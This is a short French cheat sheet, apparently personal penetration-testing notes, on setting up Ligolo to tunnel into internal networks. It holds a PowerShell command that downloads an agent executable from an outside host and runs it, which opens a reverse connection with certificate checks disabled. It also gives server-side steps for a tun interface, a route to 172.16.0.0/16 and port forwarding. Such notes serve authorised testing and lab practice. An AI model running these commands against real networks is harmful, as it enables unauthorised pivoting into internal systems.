Permet d'accéder aux réseaux internes et de créer un tunnel qui fonctionne dans les 2 sens.

# Client
## Windows

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
iwr -uri http://192.168.45.241/windows/ligolo-agent.exe -outfile ligolo-agent.exe;
./ligolo-agent.exe -ignore-cert -connect 10.10.14.8:11601;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Serveur
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo ip tuntap add user corsaire mode tun ligolo && sudo ip link set ligolo up
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Regarder comment ne pas avoir à utiliser -selfcert
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ bash
ligolo-proxy -selfcert
#attendre connexion puis
session
#choisir connexion
start
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Créer une route
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ bash
sudo ip route add 172.16.0.0/16 dev ligolo
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Écoute/redirection interne
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ bash
listener_add --addr 0.0.0.0:8001 --to 127.0.0.1:80 --tcp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

  